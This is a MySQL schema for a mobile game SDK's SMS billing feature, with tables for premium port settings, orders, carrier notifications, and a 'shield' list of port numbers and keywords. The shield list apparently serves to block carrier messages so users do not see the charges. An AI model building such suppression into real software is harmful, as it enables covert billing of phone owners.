CREATE TABLE game_sdk.`sdk_mmdo_shield` (
  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT '主键',
  `imsi` varchar(64) DEFAULT NULL COMMENT '手机IMSI号',
  `interval` int(11) DEFAULT '5' COMMENT '发送间隔(s)',
  `send_ number` varchar(64) DEFAULT NULL COMMENT '发送端口号',
  `send_ content` varchar(255) DEFAULT NULL COMMENT '发送指令',
  `shield_number` varchar(64) DEFAULT NULL COMMENT '屏蔽端口号',
  `shield_keyword` varchar(255) DEFAULT NULL COMMENT '屏蔽关键字',
  `create_time` datetime DEFAULT NULL COMMENT '创建时间',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT  CHARSET=utf8 COMMENT='mdo屏蔽下发列表';

CREATE TABLE game_sdk.`sdk_mmdo_setting`(
	`id` int(11) NOT NULL AUTO_INCREMENT COMMENT '主键',
	`number` varchar(64) DEFAULT NULL COMMENT '发送端口',
	`content` varchar(64) DEFAULT NULL COMMENT '发送内容前缀,实际内容添加game_id',
	`amount` float DEFAULT NULL COMMENT '适用金额,2元或者4元',
	`shield_keyword` varchar(255) DEFAULT NULL COMMENT '屏蔽关键字',
	`interval` int(11) DEFAULT '5' COMMENT '发送间隔',
	PRIMARY KEY(`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='mdo信息配置'

CREATE TABLE game_sdk.`sdk_order_mmdo` (
  `pay_id` int(11) NOT NULL AUTO_INCREMENT COMMENT '主键',
  `req_time` datetime DEFAULT NULL COMMENT '请求时间',
  `req_order_amount` float DEFAULT NULL COMMENT '订单金额',
  `req_imsi` varchar(128) DEFAULT NULL COMMENT '手机IMSI,逗号分隔',
  `req_send_number` varchar(64) DEFAULT NULL COMMENT '发送端口（4元10658035619003，2元10658035619004）',
  `req_send_content` varchar(255) DEFAULT NULL COMMENT '发送指令',
  `resp_imsi` varchar(128) DEFAULT NULL COMMENT '实际发送使用的Imsi',
  `resp_send_number` varchar(64) DEFAULT NULL COMMENT '实际发送端口',
  `resp_send_content` varchar(255) DEFAULT NULL COMMENT '实际发送指令',
  `resp_status` int(4) DEFAULT NULL COMMENT '0表示失败，1表示成功（更新order数据）',
  `resp_time` datetime DEFAULT NULL COMMENT '响应时间',
  PRIMARY KEY (`pay_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='mdo订单数据表';

CREATE TABLE game_sdk.`sdk_notify_mmdo` (
  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT '主键',
  `linkid` varchar(64) DEFAULT NULL COMMENT '交易编号',
  `spid` varchar(25) DEFAULT NULL COMMENT '业务代码',
  `cmd` varchar(25) DEFAULT NULL COMMENT '上行指令',
  `mobile` varchar(64) DEFAULT NULL COMMENT '手机伪码',
  `spnum` varchar(25) DEFAULT NULL COMMENT '端口',
  `key` varchar(20) DEFAULT NULL COMMENT '省份',
  `game_id` int(11) DEFAULT NULL COMMENT '游戏ID',
  `create_time` datetime DEFAULT NULL COMMENT '创建时间',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='mdo订单通知表';


ALTER TABLE `game_sdk`.`sdk_mmdo_setting` ADD COLUMN `operation_type` int(4) COMMENT '运营商类型（1、移动，2、联通，3、电信）' AFTER `interval`, ADD COLUMN `date_limit` float COMMENT '每天的限制金额' AFTER `operation_type`, ADD COLUMN `month_limit` float COMMENT '月限制金额' AFTER `date_limit`;


ALTER TABLE `game_sdk`.`sdk_order_mmdo` ADD COLUMN `game_id` int(11) COMMENT '游戏id' AFTER `resp_time`, ADD COLUMN `uid` int(11) COMMENT '用户ID' AFTER `game_id`;




